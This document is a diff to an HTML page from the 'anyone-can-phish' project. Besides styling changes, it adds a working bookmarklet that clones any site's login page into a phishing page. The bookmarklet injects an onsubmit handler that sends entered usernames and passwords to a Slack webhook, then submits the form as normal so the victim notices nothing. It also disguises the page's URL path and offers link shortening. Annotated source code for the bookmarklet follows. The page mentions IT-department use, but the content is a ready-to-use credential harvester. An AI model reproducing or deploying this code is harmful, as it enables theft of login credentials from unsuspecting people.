@@ -18,6 +18,68 @@
     div.column{display: inline-block; vertical-align: top; width: 50%;}
     div.hanging-indent{margin-left: 1.5em; text-indent: -1.5em;}
     ul.task-list{list-style: none;}
+    pre > code.sourceCode { white-space: pre; position: relative; }
+    pre > code.sourceCode > span { display: inline-block; line-height: 1.25; }
+    pre > code.sourceCode > span:empty { height: 1.2em; }
+    code.sourceCode > span { color: inherit; text-decoration: inherit; }
+    div.sourceCode { margin: 1em 0; }
+    pre.sourceCode { margin: 0; }
+    @media screen {
+    div.sourceCode { overflow: auto; }
+    }
+    @media print {
+    pre > code.sourceCode { white-space: pre-wrap; }
+    pre > code.sourceCode > span { text-indent: -5em; padding-left: 5em; }
+    }
+    pre.numberSource code
+      { counter-reset: source-line 0; }
+    pre.numberSource code > span
+      { position: relative; left: -4em; counter-increment: source-line; }
+    pre.numberSource code > span > a:first-child::before
+      { content: counter(source-line);
+        position: relative; left: -1em; text-align: right; vertical-align: baseline;
+        border: none; display: inline-block;
+        -webkit-touch-callout: none; -webkit-user-select: none;
+        -khtml-user-select: none; -moz-user-select: none;
+        -ms-user-select: none; user-select: none;
+        padding: 0 4px; width: 4em;
+        color: #aaaaaa;
+      }
+    pre.numberSource { margin-left: 3em; border-left: 1px solid #aaaaaa;  padding-left: 4px; }
+    div.sourceCode
+      {   }
+    @media screen {
+    pre > code.sourceCode > span > a:first-child::before { text-decoration: underline; }
+    }
+    code span.al { color: #ff0000; font-weight: bold; } /* Alert */
+    code span.an { color: #60a0b0; font-weight: bold; font-style: italic; } /* Annotation */
+    code span.at { color: #7d9029; } /* Attribute */
+    code span.bn { color: #40a070; } /* BaseN */
+    code span.bu { } /* BuiltIn */
+    code span.cf { color: #007020; font-weight: bold; } /* ControlFlow */
+    code span.ch { color: #4070a0; } /* Char */
+    code span.cn { color: #880000; } /* Constant */
+    code span.co { color: #60a0b0; font-style: italic; } /* Comment */
+    code span.cv { color: #60a0b0; font-weight: bold; font-style: italic; } /* CommentVar */
+    code span.do { color: #ba2121; font-style: italic; } /* Documentation */
+    code span.dt { color: #902000; } /* DataType */
+    code span.dv { color: #40a070; } /* DecVal */
+    code span.er { color: #ff0000; font-weight: bold; } /* Error */
+    code span.ex { } /* Extension */
+    code span.fl { color: #40a070; } /* Float */
+    code span.fu { color: #aaaaaa; } /* Function */
+    code span.im { } /* Import */
+    code span.in { color: #60a0b0; font-weight: bold; font-style: italic; } /* Information */
+    code span.kw { color: #007020; font-weight: bold; } /* Keyword */
+    code span.op { color: #666666; } /* Operator */
+    code span.ot { color: #007020; } /* Other */
+    code span.pp { color: #bc7a00; } /* Preprocessor */
+    code span.sc { color: #4070a0; } /* SpecialChar */
+    code span.ss { color: #bb6688; } /* SpecialString */
+    code span.st { color: #4070a0; } /* String */
+    code span.va { color: #c072ca; } /* Variable */
+    code span.vs { color: #4070a0; } /* VerbatimString */
+    code span.wa { color: #60a0b0; font-weight: bold; font-style: italic; } /* Warning */
   </style>
   <link rel="stylesheet" href="/style.css" type="text/css" />
 </head>
@@ -131,16 +193,16 @@
   };
 
   /* Replace all relative URLs with absolute ones */
-    Array.from(document.querySelectorAll("[src],[href],[action]")).map(l => {
-        if ("src" in l) {
-            l.src = (new URL(l.src, document.baseURI)).href;
-        } else if ("href" in l) {
-            l.href = (new URL(l.href, document.baseURI)).href;
-        } else if ("action" in l) {
-            l.action = (new URL(l.action, document.baseURI)).href;
+  Array.from(document.querySelectorAll("[src],[href],[action]")).map(l => {
+    if ("src" in l) {
+      l.src = (new URL(l.src, document.baseURI)).href;
+    } else if ("href" in l) {
+      l.href = (new URL(l.href, document.baseURI)).href;
+    } else if ("action" in l) {
+      l.action = (new URL(l.action, document.baseURI)).href;
     }
-        return l;
-    });
+    return l;
+  });
 
   /* Save original form attributes */
   /* This advanced version that prompts the user can be manually enabled.
@@ -217,154 +279,154 @@
 <html>
 <head>
   <style>
-        html {
-            font-family: sans-serif;
-            padding: 10px;
-        }
+    html {
+      font-family: sans-serif;
+      padding: 10px;
+    }
 
-        body {
-            padding: 15px;
-            display: block;
-            margin: auto;
+    body {
+      padding: 15px;
+      display: block;
+      margin: auto;
       margin-top: 4em;
-            max-width: 80ch;
-        }
+      max-width: 80ch;
+    }
 
-        button {
-            padding: 11px;
-            background: rgb(95, 158, 160);
-            color: white;
-            border: 0.5px solid white;
-            border-radius: 5px;
-            font-weight: bold;
-            margin-top: 5px;
-            margin-right: 5px;
-            cursor: pointer;
-        }
+    button {
+      padding: 11px;
+      background: rgb(95, 158, 160);
+      color: white;
+      border: 0.5px solid white;
+      border-radius: 5px;
+      font-weight: bold;
+      margin-top: 5px;
+      margin-right: 5px;
+      cursor: pointer;
+    }
 
-        label {
-            display: block;
-            font-variant: small-caps;
-            margin-bottom: 5px;
-        }
+    label {
+      display: block;
+      font-variant: small-caps;
+      margin-bottom: 5px;
+    }
 
-        input, textarea {
-            padding: 10px;
-            border: 0.5px solid black;
-            border-radius: 3px;
-            margin-bottom: 15px;
-            box-sizing: border-box;
-            width: 100%;
-            resize: none;
-            font-family: sans-serif;
-        }
+    input, textarea {
+      padding: 10px;
+      border: 0.5px solid black;
+      border-radius: 3px;
+      margin-bottom: 15px;
+      box-sizing: border-box;
+      width: 100%;
+      resize: none;
+      font-family: sans-serif;
+    }
 
-        hr {
-            margin-top: 3em;
-            margin-bottom: 3em;
-            border: 0;
-            border-top: 0.5px solid rgba(200, 200, 200, 1);
-        }
+    hr {
+      margin-top: 3em;
+      margin-bottom: 3em;
+      border: 0;
+      border-top: 0.5px solid rgba(200, 200, 200, 1);
+    }
 
-        footer hr {
-            margin-bottom: 1em;
-            border-top: 0.5px solid black;
-        }
+    footer hr {
+      margin-bottom: 1em;
+      border-top: 0.5px solid black;
+    }
 
-        footer p {
-            text-align: center;
-        }
-
-
-        /* View on GitHub SVG ribbon */
-        @media (max-width: 100ch) {
-            .ribbon {
-                width: 100px;
-                height: 100px;
-            }
-        }
-
-        .ribbon {
-            position: absolute;
-            top: 0;
-            right: 0;
-        }
+    footer p {
+      text-align: center;
+    }
 
 
-        /* Output area */
-        .output input {
-            background: rgba(235, 235, 235, 1);
-        }
+    /* View on GitHub SVG ribbon */
+    @media (max-width: 100ch) {
+      .ribbon {
+        width: 100px;
+        height: 100px;
+      }
+    }
 
-        .alert {
-            opacity: 0;
-            transition: opacity 0.25s;
-        }
+    .ribbon {
+      position: absolute;
+      top: 0;
+      right: 0;
+    }
+
+
+    /* Output area */
+    .output input {
+      background: rgba(235, 235, 235, 1);
+    }
+
+    .alert {
+      opacity: 0;
+      transition: opacity 0.25s;
+    }
   </style>
   <script>
-        /* Highlight the text in an input with a given ID */
-        function highlight(id) {
-            let output = document.querySelector("#" + id);
-            output.focus();
-            output.select();
-            output.setSelectionRange(0, output.value.length + 1);
-            return output;
-        }
+    /* Highlight the text in an input with a given ID */
+    function highlight(id) {
+      let output = document.querySelector("#" + id);
+      output.focus();
+      output.select();
+      output.setSelectionRange(0, output.value.length + 1);
+      return output;
+    }
 
-        /* Activated when the "Copy" button is pressed */
-        function onCopy(id) {
-            /* Select and copy */
-            const output = highlight(id);
-            document.execCommand("copy");
+    /* Activated when the "Copy" button is pressed */
+    function onCopy(id) {
+      /* Select and copy */
+      const output = highlight(id);
+      document.execCommand("copy");
 
-            /* Alert the user that the text was successfully copied */
-            const alertArea = document.querySelector(".alert");
-            alertArea.innerText = "Copied " + output.value.length + " characters";
-            alertArea.style.opacity = "1";
-            setTimeout(() => { alertArea.style.opacity = 0; }, 3000);
+      /* Alert the user that the text was successfully copied */
+      const alertArea = document.querySelector(".alert");
+      alertArea.innerText = "Copied " + output.value.length + " characters";
+      alertArea.style.opacity = "1";
+      setTimeout(() => { alertArea.style.opacity = 0; }, 3000);
 
-            /* Deselect */
-            output.selectionEnd = output.selectionStart;
-            output.blur();
-        }
+      /* Deselect */
+      output.selectionEnd = output.selectionStart;
+      output.blur();
+    }
   </script>
 </head>
 <body>
-    <!-- View on GitHub ribbon -->
-    <a href="https://github.com/jstrieb/anyone-can-phish" target="_blank">
-        <img class="ribbon" src="https://jstrieb.github.io/link-lock/corner-ribbon-minified.svg" alt="View on GitHub" />
-    </a>
+  <!-- View on GitHub ribbon -->
+  <a href="https://github.com/jstrieb/anyone-can-phish" target="_blank">
+    <img class="ribbon" src="https://jstrieb.github.io/link-lock/corner-ribbon-minified.svg" alt="View on GitHub" />
+  </a>
 
-    <!-- Explanatory message -->
-    <p>The link below is a fake login page. Whenever someone enters a username and password at the fake login page, it will send them in an email to <a href="mailto:${EMAIL}">${EMAIL}</a>. The email comes from <a href="https://formsend.co">formsend.co</a>. The first time an email from Formsend is received, you must confirm your address by hitting the big green button in the message. Once confirmed, any logins at the fake page will be sent directly to the email address.</p>
+  <!-- Explanatory message -->
+  <p>The link below is a fake login page. Whenever someone enters a username and password at the fake login page, it will send them in an email to <a href="mailto:${EMAIL}">${EMAIL}</a>. The email comes from <a href="https://formsend.co">formsend.co</a>. The first time an email from Formsend is received, you must confirm your address by hitting the big green button in the message. Once confirmed, any logins at the fake page will be sent directly to the email address.</p>
 
-    <p>The fake page below is a modified clone of <a href="${document.baseURI}" target="_blank">${document.baseURI}</a>.</p>
-    <hr />
+  <p>The fake page below is a modified clone of <a href="${document.baseURI}" target="_blank">${document.baseURI}</a>.</p>
+  <hr />
 
-    <!-- Output area -->
-    <div class="output">
-        <label for="output">fake login page url</label>
-        <input type="text" id="output" readonly />
-        <button id="copy" onclick="onCopy(&apos;output&apos;)">Copy</button>
-        <a href="" id="open" target="_blank" onclick="this.href = document.querySelector(&apos;#output&apos;).value"><button>Test in New Tab</button></a>
-        <!-- Special incantation to make TinyURL work -->
-        <form action="https://tinyurl.com/create.php" method="get" target="_blank" style="display: inline;" onsubmit="this.tinyurl.value = document.querySelector(&apos;#output&apos;).value;">
-            <input type="hidden" id="source" name="source" value="indexpage" />
-            <input type="hidden" id="tinyurl" name="url" value = "" />
-            <button>Get Shortened Link</button>
-        </form>
-        <p class="alert">Copied</p>
-    </div>
+  <!-- Output area -->
+  <div class="output">
+    <label for="output">fake login page url</label>
+    <input type="text" id="output" readonly />
+    <button id="copy" onclick="onCopy(&#39;output&#39;)">Copy</button>
+    <a href="" id="open" target="_blank" onclick="this.href = document.querySelector(&#39;#output&#39;).value"><button>Test in New Tab</button></a>
+    <!-- Special incantation to make TinyURL work -->
+    <form action="https://tinyurl.com/create.php" method="get" target="_blank" style="display: inline;" onsubmit="this.tinyurl.value = document.querySelector(&#39;#output&#39;).value;">
+      <input type="hidden" id="source" name="source" value="indexpage" />
+      <input type="hidden" id="tinyurl" name="url" value = "" />
+      <button>Get Shortened Link</button>
+    </form>
+    <p class="alert">Copied</p>
+  </div>
 
-    <!-- Page footer -->
-    <footer>
-    <hr />
-    <p class="copyright">Created by <a href="https://jstrieb.github.io">Jacob Strieb</a>.</p>
-    </footer>
+  <!-- Page footer -->
+  <footer>
+  <hr />
+  <p class="copyright">Created by <a href="https://jstrieb.github.io">Jacob Strieb</a>.</p>
+  </footer>
 </body>
 </html>
 `);
-    document.querySelector("#output").value = newURL;
+  document.querySelector("#output").value = newURL;
 
   /* Open the URL Page in a new window for testing */
   /* window.open(newURL, "", "left=10"); */
@@ -378,6 +440,604 @@
 <li><p>The fake login page will open in a new tab. Try entering a fake username and fake password. When you do this, you will receive an email from <code>formsubmit.co</code>. Click the green confirmation button in this email.</p></li>
 <li><p>After confirming your email, any credentials entered at the link you generated will be sent directly to your email.</p></li>
 </ol>
+<hr />
+<h1 id="advanced-usage">Advanced Usage</h1>
+<p>It is possible to use a modified version of the bookmarklet to send credentials back to the user using a chatbot, rather than over email. This is useful if, for example, the IT department of an organization wants to receive credentials in their Slack channel.<a href="#fn1" class="footnote-ref" id="fnref1" role="doc-noteref"><sup>1</sup></a></p>
+<p>Moreover, it is possible to customize the CSS selector used to select forms on the page for injecting JavaScript. It is also possible to customize the new path that is set on the URL via <code>window.history.pushState</code>. This advanced bookmark that prompts the user for CSS selectors, new URL paths, and will work with a Slack bot is included below.</p>
+<div class="button-container">
+<a class="button" href='javascript:(() => {
+  /* Constants */
+  const URL_PAGES = "https://jstrieb.github.io/urlpages";
+  const POST_PAGE = window.prompt("Enter the Slack bot webhooks URL: ");
+  if (!POST_PAGE) return;
+
+  /* Generate the b64 API functions */
+  var b64 = (() => {
+    function generateIndexDict(a) {
+      let result = {};
+      for (let i = 0; i < a.length; i++) {
+        result[a[i]] = i;
+      }
+      return result;
+    }
+    const _a = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
+    const _aRev = generateIndexDict(_a);
+    _aRev["-"] = _aRev["+"];
+    _aRev["_"] = _aRev["/"];
+
+    const _enc = new TextEncoder("utf-8");
+    const _dec = new TextDecoder("utf-8");
+
+    return {
+      encode: function(s) {
+        return this.binaryToBase64(this.asciiToBinary(s));
+      },
+
+      asciiToBinary: function(text) {
+        return _enc.encode(text);
+      },
+
+      binaryToBase64: function(originalBytes) {
+        let length = originalBytes.length;
+        let added = (length % 3 == 0) ? 0 : (3 - length % 3);
+        let bytes = new Uint8Array(length + added);
+        bytes.set(originalBytes);
+
+        let output = "";
+        for (let i = 0; i < bytes.length; i += 3) {
+          output += _a[ bytes[i] >>> 2 ];
+          output += _a[ ((bytes[i] & 0x3) << 4) | (bytes[i + 1] >>> 4) ];
+          output += _a[ ((bytes[i + 1] & 0xF) << 2) | (bytes[i + 2] >>> 6) ];
+          output += _a[ bytes[i + 2] & 0x3F ];
+        }
+
+        if (added > 0) {
+          output = output.slice(0, -added) + ("=".repeat(added));
+        }
+
+        return output;
+      },
+    }
+  })();
+
+  /* Generate the page -> base64 API functions */
+  var api = {
+    VERSION: "0.2.0",
+
+    getViewLink: function(pageData) {
+      var urlData = {
+        version: this.VERSION,
+        compressed: false,
+        body: pageData,
+      };
+
+      const hashObject = b64.encode(JSON.stringify(urlData));
+      return `${URL_PAGES}/#${hashObject}`;
+    },
+  };
+
+  /* Replace all relative URLs with absolute ones */
+  Array.from(document.querySelectorAll("[src],[href],[action]")).map(l => {
+    if ("src" in l) {
+      l.src = (new URL(l.src, document.baseURI)).href;
+    } else if ("href" in l) {
+      l.href = (new URL(l.href, document.baseURI)).href;
+    } else if ("action" in l) {
+      l.action = (new URL(l.action, document.baseURI)).href;
+    }
+    return l;
+  });
+
+  /* Save original form attributes */
+  /* This advanced version that prompts the user can be manually enabled. */
+  const selector = window.prompt("Login form CSS selector", "form");
+  if (!selector) return;
+  Array.from(document.querySelectorAll(selector)).map(form => {
+    var original = { onsubmit: "" + (form.onsubmit ? form.onsubmit : "") };
+
+    /* Modify the location the form will submit to */
+    form.setAttribute("original", JSON.stringify(original));
+
+    /* Create an onsubmit function that will submit to Slack then submit it a
+     * second time */
+    var newOnsubmit = (async (submittedForm) => {
+      /* Create a string to send */
+      var children = submittedForm.elements;
+      var childStrings = Array.from(children).map(e => `${e.name}: ${e.value}`);
+      var sendText = childStrings.reduce((acc, cur) => acc + cur + "\n",
+        "URL: replaceme\n").slice(0, 990);
+
+      /* Send the data to Slack */
+      await fetch("replace22", {
+            mode: "no-cors",
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ text: sendText }),
+          });
+
+      /* Actually submit the form for real */
+      submittedForm.submit();
+
+      return false;
+    }).toString().replace("replaceme", document.baseURI).replace("replace22", POST_PAGE);
+    form.setAttribute("onsubmit", `(${newOnsubmit})(this); return false;`);
+  });
+
+  /* Change the path so it doesnt look like a URL Page */
+  var currentURL = new URL(document.baseURI);
+  var path = currentURL.pathname + currentURL.search;
+  /* This advanced version that prompts the user can be manually enabled. */
+  const newPath = window.prompt("New path: ", path);
+  if (!newPath) return;
+  /* const newPath = path; */
+  var onload = (() => {
+    window.history.pushState("", "", "replaceme");
+    document.body.removeAttribute("onload");
+  }).toString().replace("replaceme", newPath);
+  document.body.setAttribute("onload", `(${onload})()`);
+
+  /* Generate a new URL */
+  var newURL = api.getViewLink(document.documentElement.outerHTML);
+
+  /* Overwrite the current page with a way to copy the generated URL */
+  document.write(`
+<html>
+<head>
+  <style>
+    html {
+      font-family: sans-serif;
+      padding: 10px;
+    }
+
+    body {
+      padding: 15px;
+      display: block;
+      margin: auto;
+      margin-top: 4em;
+      max-width: 80ch;
+    }
+
+    button {
+      padding: 11px;
+      background: rgb(95, 158, 160);
+      color: white;
+      border: 0.5px solid white;
+      border-radius: 5px;
+      font-weight: bold;
+      margin-top: 5px;
+      margin-right: 5px;
+      cursor: pointer;
+    }
+
+    label {
+      display: block;
+      font-variant: small-caps;
+      margin-bottom: 5px;
+    }
+
+    input, textarea {
+      padding: 10px;
+      border: 0.5px solid black;
+      border-radius: 3px;
+      margin-bottom: 15px;
+      box-sizing: border-box;
+      width: 100%;
+      resize: none;
+      font-family: sans-serif;
+    }
+
+    hr {
+      margin-top: 3em;
+      margin-bottom: 3em;
+      border: 0;
+      border-top: 0.5px solid rgba(200, 200, 200, 1);
+    }
+
+    footer hr {
+      margin-bottom: 1em;
+      border-top: 0.5px solid black;
+    }
+
+    footer p {
+      text-align: center;
+    }
+
+
+    /* View on GitHub SVG ribbon */
+    @media (max-width: 100ch) {
+      .ribbon {
+        width: 100px;
+        height: 100px;
+      }
+    }
+
+    .ribbon {
+      position: absolute;
+      top: 0;
+      right: 0;
+    }
+
+
+    /* Output area */
+    .output input {
+      background: rgba(235, 235, 235, 1);
+    }
+
+    .alert {
+      opacity: 0;
+      transition: opacity 0.25s;
+    }
+  </style>
+  <script>
+    /* Highlight the text in an input with a given ID */
+    function highlight(id) {
+      let output = document.querySelector("#" + id);
+      output.focus();
+      output.select();
+      output.setSelectionRange(0, output.value.length + 1);
+      return output;
+    }
+
+    /* Activated when the "Copy" button is pressed */
+    function onCopy(id) {
+      /* Select and copy */
+      const output = highlight(id);
+      document.execCommand("copy");
+
+      /* Alert the user that the text was successfully copied */
+      const alertArea = document.querySelector(".alert");
+      alertArea.innerText = "Copied " + output.value.length + " characters";
+      alertArea.style.opacity = "1";
+      setTimeout(() => { alertArea.style.opacity = 0; }, 3000);
+
+      /* Deselect */
+      output.selectionEnd = output.selectionStart;
+      output.blur();
+    }
+  </script>
+</head>
+<body>
+  <!-- View on GitHub ribbon -->
+  <a href="https://github.com/jstrieb/anyone-can-phish" target="_blank">
+    <img class="ribbon" src="https://jstrieb.github.io/link-lock/corner-ribbon-minified.svg" alt="View on GitHub" />
+  </a>
+
+  <!-- Explanatory message -->
+  <p>The link below is a fake login page. Whenever someone enters a username and password at the fake login page, it will send them as a Slack message to <a href="${POST_PAGE}">${POST_PAGE}</a>. The message will come from a Slack bot</p>
+
+  <p>The fake page below is a modified clone of <a href="${document.baseURI}" target="_blank">${document.baseURI}</a>.</p>
+  <hr />
+
+  <!-- Output area -->
+  <div class="output">
+    <label for="output">fake login page url</label>
+    <input type="text" id="output" readonly />
+    <button id="copy" onclick="onCopy(&#39;output&#39;)">Copy</button>
+    <a href="" id="open" target="_blank" onclick="this.href = document.querySelector(&#39;#output&#39;).value"><button>Test in New Tab</button></a>
+    <!-- Special incantation to make TinyURL work -->
+    <form action="https://tinyurl.com/create.php" method="get" target="_blank" style="display: inline;" onsubmit="this.tinyurl.value = document.querySelector(&#39;#output&#39;).value;">
+      <input type="hidden" id="source" name="source" value="indexpage" />
+      <input type="hidden" id="tinyurl" name="url" value = "" />
+      <button>Get Shortened Link</button>
+    </form>
+    <p class="alert">Copied</p>
+  </div>
+
+  <!-- Page footer -->
+  <footer>
+  <hr />
+  <p class="copyright">Created by <a href="https://jstrieb.github.io">Jacob Strieb</a>.</p>
+  </footer>
+</body>
+</html>
+`);
+  document.querySelector("#output").value = newURL;
+
+  /* Open the URL Page in a new window for testing */
+  /* window.open(newURL, "", "left=10"); */
+})();
+'>Generate Phishing Page and Send Credentials via Slack</a>
+</div>
+<hr />
+<h1 id="source-code">Source Code</h1>
+<p>For the curious, here is the annotated source code for the bookmarklet.</p>
+<div class="sourceCode" id="cb1"><pre class="sourceCode javascript"><code class="sourceCode javascript"><span id="cb1-1"><a href="#cb1-1"></a>(() <span class="kw">=&gt;</span> {</span>
+<span id="cb1-2"><a href="#cb1-2"></a>  <span class="co">/* Constants */</span></span>
+<span id="cb1-3"><a href="#cb1-3"></a>  <span class="kw">const</span> URL_PAGES <span class="op">=</span> <span class="st">&quot;https://jstrieb.github.io/urlpages&quot;</span><span class="op">;</span></span>
+<span id="cb1-4"><a href="#cb1-4"></a>  <span class="kw">const</span> POST_PAGE <span class="op">=</span> <span class="bu">window</span><span class="op">.</span><span class="at">prompt</span>(<span class="st">&quot;Enter the Slack bot webhooks URL: &quot;</span>)<span class="op">;</span></span>
+<span id="cb1-5"><a href="#cb1-5"></a>  <span class="cf">if</span> (<span class="op">!</span>POST_PAGE) <span class="cf">return</span><span class="op">;</span></span>
+<span id="cb1-6"><a href="#cb1-6"></a></span>
+<span id="cb1-7"><a href="#cb1-7"></a>  <span class="co">/* Generate the b64 API functions */</span></span>
+<span id="cb1-8"><a href="#cb1-8"></a>  <span class="kw">var</span> b64 <span class="op">=</span> (() <span class="kw">=&gt;</span> {</span>
+<span id="cb1-9"><a href="#cb1-9"></a>    <span class="kw">function</span> generateIndexDict(a) {</span>
+<span id="cb1-10"><a href="#cb1-10"></a>      <span class="kw">let</span> result <span class="op">=</span> {}<span class="op">;</span></span>
+<span id="cb1-11"><a href="#cb1-11"></a>      <span class="cf">for</span> (<span class="kw">let</span> i <span class="op">=</span> <span class="dv">0</span><span class="op">;</span> i <span class="op">&lt;</span> a<span class="op">.</span><span class="at">length</span><span class="op">;</span> i<span class="op">++</span>) {</span>
+<span id="cb1-12"><a href="#cb1-12"></a>        result[a[i]] <span class="op">=</span> i<span class="op">;</span></span>
+<span id="cb1-13"><a href="#cb1-13"></a>      }</span>
+<span id="cb1-14"><a href="#cb1-14"></a>      <span class="cf">return</span> result<span class="op">;</span></span>
+<span id="cb1-15"><a href="#cb1-15"></a>    }</span>
+<span id="cb1-16"><a href="#cb1-16"></a>    <span class="kw">const</span> _a <span class="op">=</span> <span class="st">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span><span class="op">;</span></span>
+<span id="cb1-17"><a href="#cb1-17"></a>    <span class="kw">const</span> _aRev <span class="op">=</span> generateIndexDict(_a)<span class="op">;</span></span>
+<span id="cb1-18"><a href="#cb1-18"></a>    _aRev[<span class="st">&quot;-&quot;</span>] <span class="op">=</span> _aRev[<span class="st">&quot;+&quot;</span>]<span class="op">;</span></span>
+<span id="cb1-19"><a href="#cb1-19"></a>    _aRev[<span class="st">&quot;_&quot;</span>] <span class="op">=</span> _aRev[<span class="st">&quot;/&quot;</span>]<span class="op">;</span></span>
+<span id="cb1-20"><a href="#cb1-20"></a></span>
+<span id="cb1-21"><a href="#cb1-21"></a>    <span class="kw">const</span> _enc <span class="op">=</span> <span class="kw">new</span> TextEncoder(<span class="st">&quot;utf-8&quot;</span>)<span class="op">;</span></span>
+<span id="cb1-22"><a href="#cb1-22"></a>    <span class="kw">const</span> _dec <span class="op">=</span> <span class="kw">new</span> TextDecoder(<span class="st">&quot;utf-8&quot;</span>)<span class="op">;</span></span>
+<span id="cb1-23"><a href="#cb1-23"></a></span>
+<span id="cb1-24"><a href="#cb1-24"></a>    <span class="cf">return</span> {</span>
+<span id="cb1-25"><a href="#cb1-25"></a>      <span class="dt">encode</span><span class="op">:</span> <span class="kw">function</span>(s) {</span>
+<span id="cb1-26"><a href="#cb1-26"></a>        <span class="cf">return</span> <span class="kw">this</span><span class="op">.</span><span class="fu">binaryToBase64</span>(<span class="kw">this</span><span class="op">.</span><span class="fu">asciiToBinary</span>(s))<span class="op">;</span></span>
+<span id="cb1-27"><a href="#cb1-27"></a>      }<span class="op">,</span></span>
+<span id="cb1-28"><a href="#cb1-28"></a></span>
+<span id="cb1-29"><a href="#cb1-29"></a>      <span class="dt">asciiToBinary</span><span class="op">:</span> <span class="kw">function</span>(text) {</span>
+<span id="cb1-30"><a href="#cb1-30"></a>        <span class="cf">return</span> _enc<span class="op">.</span><span class="fu">encode</span>(text)<span class="op">;</span></span>
+<span id="cb1-31"><a href="#cb1-31"></a>      }<span class="op">,</span></span>
+<span id="cb1-32"><a href="#cb1-32"></a></span>
+<span id="cb1-33"><a href="#cb1-33"></a>      <span class="dt">binaryToBase64</span><span class="op">:</span> <span class="kw">function</span>(originalBytes) {</span>
+<span id="cb1-34"><a href="#cb1-34"></a>        <span class="kw">let</span> length <span class="op">=</span> originalBytes<span class="op">.</span><span class="at">length</span><span class="op">;</span></span>
+<span id="cb1-35"><a href="#cb1-35"></a>        <span class="kw">let</span> added <span class="op">=</span> (length <span class="op">%</span> <span class="dv">3</span> <span class="op">==</span> <span class="dv">0</span>) <span class="op">?</span> <span class="dv">0</span> <span class="op">:</span> (<span class="dv">3</span> <span class="op">-</span> length <span class="op">%</span> <span class="dv">3</span>)<span class="op">;</span></span>
+<span id="cb1-36"><a href="#cb1-36"></a>        <span class="kw">let</span> bytes <span class="op">=</span> <span class="kw">new</span> <span class="bu">Uint8Array</span>(length <span class="op">+</span> added)<span class="op">;</span></span>
+<span id="cb1-37"><a href="#cb1-37"></a>        bytes<span class="op">.</span><span class="fu">set</span>(originalBytes)<span class="op">;</span></span>
+<span id="cb1-38"><a href="#cb1-38"></a></span>
+<span id="cb1-39"><a href="#cb1-39"></a>        <span class="kw">let</span> output <span class="op">=</span> <span class="st">&quot;&quot;</span><span class="op">;</span></span>
+<span id="cb1-40"><a href="#cb1-40"></a>        <span class="cf">for</span> (<span class="kw">let</span> i <span class="op">=</span> <span class="dv">0</span><span class="op">;</span> i <span class="op">&lt;</span> bytes<span class="op">.</span><span class="at">length</span><span class="op">;</span> i <span class="op">+=</span> <span class="dv">3</span>) {</span>
+<span id="cb1-41"><a href="#cb1-41"></a>          output <span class="op">+=</span> _a[ bytes[i] <span class="op">&gt;&gt;&gt;</span> <span class="dv">2</span> ]<span class="op">;</span></span>
+<span id="cb1-42"><a href="#cb1-42"></a>          output <span class="op">+=</span> _a[ ((bytes[i] <span class="op">&amp;</span> <span class="bn">0x3</span>) <span class="op">&lt;&lt;</span> <span class="dv">4</span>) <span class="op">|</span> (bytes[i <span class="op">+</span> <span class="dv">1</span>] <span class="op">&gt;&gt;&gt;</span> <span class="dv">4</span>) ]<span class="op">;</span></span>
+<span id="cb1-43"><a href="#cb1-43"></a>          output <span class="op">+=</span> _a[ ((bytes[i <span class="op">+</span> <span class="dv">1</span>] <span class="op">&amp;</span> <span class="bn">0xF</span>) <span class="op">&lt;&lt;</span> <span class="dv">2</span>) <span class="op">|</span> (bytes[i <span class="op">+</span> <span class="dv">2</span>] <span class="op">&gt;&gt;&gt;</span> <span class="dv">6</span>) ]<span class="op">;</span></span>
+<span id="cb1-44"><a href="#cb1-44"></a>          output <span class="op">+=</span> _a[ bytes[i <span class="op">+</span> <span class="dv">2</span>] <span class="op">&amp;</span> <span class="bn">0x3F</span> ]<span class="op">;</span></span>
+<span id="cb1-45"><a href="#cb1-45"></a>        }</span>
+<span id="cb1-46"><a href="#cb1-46"></a></span>
+<span id="cb1-47"><a href="#cb1-47"></a>        <span class="cf">if</span> (added <span class="op">&gt;</span> <span class="dv">0</span>) {</span>
+<span id="cb1-48"><a href="#cb1-48"></a>          output <span class="op">=</span> output<span class="op">.</span><span class="fu">slice</span>(<span class="dv">0</span><span class="op">,</span> <span class="op">-</span>added) <span class="op">+</span> (<span class="st">&quot;=&quot;</span><span class="op">.</span><span class="fu">repeat</span>(added))<span class="op">;</span></span>
+<span id="cb1-49"><a href="#cb1-49"></a>        }</span>
+<span id="cb1-50"><a href="#cb1-50"></a></span>
+<span id="cb1-51"><a href="#cb1-51"></a>        <span class="cf">return</span> output<span class="op">;</span></span>
+<span id="cb1-52"><a href="#cb1-52"></a>      }<span class="op">,</span></span>
+<span id="cb1-53"><a href="#cb1-53"></a>    }</span>
+<span id="cb1-54"><a href="#cb1-54"></a>  })()<span class="op">;</span></span>
+<span id="cb1-55"><a href="#cb1-55"></a></span>
+<span id="cb1-56"><a href="#cb1-56"></a>  <span class="co">/* Generate the page -&gt; base64 API functions */</span></span>
+<span id="cb1-57"><a href="#cb1-57"></a>  <span class="kw">var</span> api <span class="op">=</span> {</span>
+<span id="cb1-58"><a href="#cb1-58"></a>    <span class="dt">VERSION</span><span class="op">:</span> <span class="st">&quot;0.2.0&quot;</span><span class="op">,</span></span>
+<span id="cb1-59"><a href="#cb1-59"></a></span>
+<span id="cb1-60"><a href="#cb1-60"></a>    <span class="dt">getViewLink</span><span class="op">:</span> <span class="kw">function</span>(pageData) {</span>
+<span id="cb1-61"><a href="#cb1-61"></a>      <span class="kw">var</span> urlData <span class="op">=</span> {</span>
+<span id="cb1-62"><a href="#cb1-62"></a>        <span class="dt">version</span><span class="op">:</span> <span class="kw">this</span><span class="op">.</span><span class="at">VERSION</span><span class="op">,</span></span>
+<span id="cb1-63"><a href="#cb1-63"></a>        <span class="dt">compressed</span><span class="op">:</span> <span class="kw">false</span><span class="op">,</span></span>
+<span id="cb1-64"><a href="#cb1-64"></a>        <span class="dt">body</span><span class="op">:</span> pageData<span class="op">,</span></span>
+<span id="cb1-65"><a href="#cb1-65"></a>      }<span class="op">;</span></span>
+<span id="cb1-66"><a href="#cb1-66"></a></span>
+<span id="cb1-67"><a href="#cb1-67"></a>      <span class="kw">const</span> hashObject <span class="op">=</span> b64<span class="op">.</span><span class="fu">encode</span>(<span class="bu">JSON</span><span class="op">.</span><span class="fu">stringify</span>(urlData))<span class="op">;</span></span>
